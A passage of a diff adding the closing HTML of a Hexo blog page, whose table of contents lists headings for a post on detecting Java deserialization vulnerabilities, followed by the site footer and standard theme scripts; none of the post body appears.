class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B8%E5%BC%B9"><span class="nav-number">4.1.</span> <span class="nav-text">反序列化炸弹</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%85%8D%E5%90%88checklist"><span class="nav-number">5.</span> <span class="nav-text">配合checklist</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">79.1k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#serialVersionUID%E9%97%AE%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">serialVersionUID问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BA%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.</span> <span class="nav-text">出网探测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">DNS法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JRMP%E6%B3%95"><span class="nav-number">3.2.</span> <span class="nav-text">JRMP法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#httplog"><span class="nav-number">3.3.</span> <span class="nav-text">httplog</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.</span> <span class="nav-text">不出网探测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B8%E5%BC%B9"><span class="nav-number">4.1.</span> <span class="nav-text">反序列化炸弹</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%85%8D%E5%90%88checklist"><span class="nav-number">5.</span> <span class="nav-text">配合checklist</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
